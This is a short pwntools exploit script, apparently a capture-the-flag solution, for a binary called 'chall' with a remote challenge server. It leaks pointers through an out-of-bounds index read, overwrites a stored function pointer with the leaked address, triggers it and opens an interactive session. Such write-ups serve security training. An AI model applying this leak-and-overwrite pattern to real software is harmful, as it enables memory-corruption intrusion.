#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = "info"


def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript="continue")
    elif args.REMOTE:
        return remote("play.scriptsorcerers.xyz", 10012)
    else:
        return process(exe.path)


p = start()


def read_data(index):
    p.sendline(b"2")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Data: ")
    return p.recv(6)


def store_data(index, data):
    p.sendline(b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Data: ", data)


p.sendline(b"123455")
leak_f = u64(read_data(9).ljust(8, b"\x00"))
leak_input = u64(read_data(8).ljust(8, b"\x00"))

log.success(f"f        = {hex(leak_f)}")
log.success(f"input_fp = {hex(leak_input)}")

store_data(8, p64(leak_f))

p.sendline(b"3")

p.interactive()
